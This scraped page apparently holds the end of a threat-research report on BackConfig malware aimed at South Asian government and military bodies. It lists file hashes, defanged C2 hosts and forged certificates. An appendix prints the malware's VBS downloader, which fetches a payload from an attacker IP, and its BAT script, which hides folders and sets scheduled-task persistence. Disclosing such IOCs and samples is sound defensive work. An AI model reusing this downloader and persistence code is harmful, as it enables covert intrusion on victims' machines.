campaign)\r\n952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a (Down_LinkLog.vbs)\r\na1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs using BITS)\r\nEXE Payloads\r\n306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644\r\n0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92\r\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c\r\n18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9\r\n922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709\r\n4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5\r\n677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2\r\nd3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f\r\n91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1\r\nde5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a\r\nf79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b\r\n9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77\r\n6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e\r\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f\r\n07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda\r\n31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848\r\n15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892\r\nD87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861\r\n167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e\r\n4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older set of downloaders)\r\nb18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 (driverkit.zip)\r\nInfrastructure\r\nlinkrequest[.]live (23.106.123[.]87)\r\nmatissues[.]com\r\nunique.fontsupdate[.]com\r\n185.203.119[.]184\r\n212.114.52[.]148\r\nDigital Signatures\r\nThe following list of self-signed digital certificates is not exhaustive, and only relates to those seen on BackConfig PE executables samples over the past twelve months.\r\n\r\n \tFoxit:\r\n\r\nthumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01\r\nissuer: CN=Foxit Software Incorporated\r\nsubject: CN=Foxit Software Incorporated\r\nversion: 3\r\nalgorithm: sha1WithRSAEncryption\r\nserial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8\r\nvalid from: 1\/1\/2018\r\nvalid to: 1\/1\/2024\r\n\r\n \tWind0ws:\r\n\r\nthumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0\r\nissuer: CN=wind0ws\r\nsubject: CN=wind0ws\r\nversion: 3\r\nalgorithm: sha1WithRSAEncryption\r\nserial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70\r\nvalid from: 1\/1\/2019\r\nvalid to: 1\/1\/2025\r\n\r\n \tNVIDIA:\r\n\r\nthumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3\r\nissuer: CN=NVIDIA Corporation\r\nsubject: CN=NVIDIA Corporation\r\nversion: 3\r\nalgorithm: sha1WithRSAEncryption\r\nserial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1\r\nvalid from: 1\/1\/2019\r\nvalid to: 1\/1\/2025\r\nAppendix\r\nThe following VBS and BAT code was extracted from XLS sample (SHA-256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83).\r\n\r\n \tVBS downloader component (SHA256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)\r\n\r\n[Drive.txt -&gt; Drive.vbs CODE]\r\nstrFileURL = \"http:\/\/185.203.119[.]184\/Dropbox\/request\" \r\nSet oShell = CreateObject(\"WScript.Shell\") \r\n     strHomeFolder = \r\noShell.ExpandEnvironmentStrings(\"%USERPROFILE%\") \r\n     strPath = \"C:\\Drivers\\dphc.exe\" \r\nOn Error Resume Next \r\nSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") \r\n    objXMLHTTP.open \"GET\", strFileURL, false \r\n    objXMLHTTP.send() \r\nIf objXMLHTTP.Status = 200 Then \r\nSet objADOStream = CreateObject(\"ADODB.Stream\") \r\nobjADOStream.Open \r\nobjADOStream.Type = 1  \r\nobjADOStream.Write objXMLHTTP.ResponseBody \r\nobjADOStream.Position = 0     \r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\") \r\nIf objFSO.Fileexists(strPath) Then WScript.Quit() \r\nSet objFSO = Nothing \r\nobjADOStream.SaveToFile strPath \r\nobjADOStream.Close \r\nSet objADOStream = Nothing \r\nEnd if \r\nSet objXMLHTTP = Nothing  \r\n\r\n\r\n \t\u201cSetup\u201d BAT component\r\n\r\n[Audio.txt -&gt; Audio.bat CODE]\r\nSet oFile = fso.CreateTextFile(\"c:\\Drivers\\Audio.txt\")\r\noFile.WriteLine (\"echo off\")\r\noFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\pdf\")\r\noFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\dwg\")\r\noFile.WriteLine (\"md %USERPROFILE%\\Daily\\Backup\\Files\")\r\noFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Adobe\")\r\noFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Daily\")\r\noFile.WriteLine (\"attrib +a +h +s C:\\Drivers\")\r\noFile.WriteLine (\"del \/f \r\n%USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\r\noFile.WriteLine (\"del \/f \r\n%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\"\r\noFile.WriteLine (\"SET \/A %COMPUTERNAME%\")\r\noFile.WriteLine (\"SET \/A RAND=%RANDOM% 10000 + 1\")\r\noFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% &gt;&gt; \r\n%USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\r\noFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% &gt;&gt; \r\n%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\")\r\noFile.WriteLine (\"schtasks \/delete \/tn Winmgt_log \/f\")\r\noFile.WriteLine (\"schtasks \/delete \/tn Yahoo_Drive \/f\")\r\noFile.WriteLine (\"schtasks \/create \/sc minute \/mo 10 \/f \/tn \r\nWinmgt_log \/tr C:\\Drivers\\dphc.exe\")\r\noFile.WriteLine (\"schtasks \/create \/sc minute \/mo 20 \/f \/tn \r\nYahoo_Drive \/tr C:\\Drivers\\Drive.vbs\")\r\noFile.WriteLine (\"ren C:\\Drivers\\Drive.txt Drive.vbs \")\r\noFile.WriteLine (\"del %0\")\r\noFile.Close\r\nSet fso = Nothing\r\nSet oFile = Nothing\r\n\r\n    Dim OldName, NewName\r\n    GivenLocation = \"C:\\Drivers\\\"\r\n    OldName = \"Audio.txt\"\r\n    NewName = \"Audio.bat\"\r\n    On Error Resume Next\r\n    Name GivenLocation &amp; OldName As GivenLocation &amp; NewName\r\n    Dim RetVal\r\n    RetVal = Shell(\"C:\\Drivers\\Audio.bat\", vbHide)\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2019\/11\/Malware-r3d2-150x150.png","width":150,"height":150},"author":[{"@type":"Person","name":"Alex Hinchliffe"},{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"107187","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=107187' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fupdated-backconfig-malware-targeting-government-and-military-organizations%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fupdated-backconfig-malware-targeting-government-and-military-organizations%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-107187 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Updated BackConfig Malware Targeting Government and Military Organizations in South Asia</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-107187 entry-meta">
			
			
			<span class="post-views-count">22,536</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'107187','like')"><i class="ui ui-2"></i><span class="ml-5">9</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 16</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fupdated-backconfig-malware-targeting-government-and-military-organizations%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fupdated-backconfig-malware-targeting-government-and-military-organizations%2F+-+Updated+BackConfig+Malware+Targeting+Government+and+Military+Organizations+in+South+Asia" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fupdated-backconfig-malware-targeting-government-and-military-organizations%2F&title=Updated+BackConfig+Malware+Targeting+Government+and+Military+Organizations+in+South+Asia&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/" title="Posts by Alex Hinchliffe" class="author url fn" rel="author">Alex Hinchliffe</a> and <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2020-05-12T04:30:43+00:00">May 11, 2020 at 9:30 PM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/backconfig/" rel="tag">BackConfig</a>, <a href="https://unit42.paloaltonetworks.com/tag/hangover-threat-group/" rel="tag">Hangover Threat Group</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/spearphishing/" rel="tag">spearphishing</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
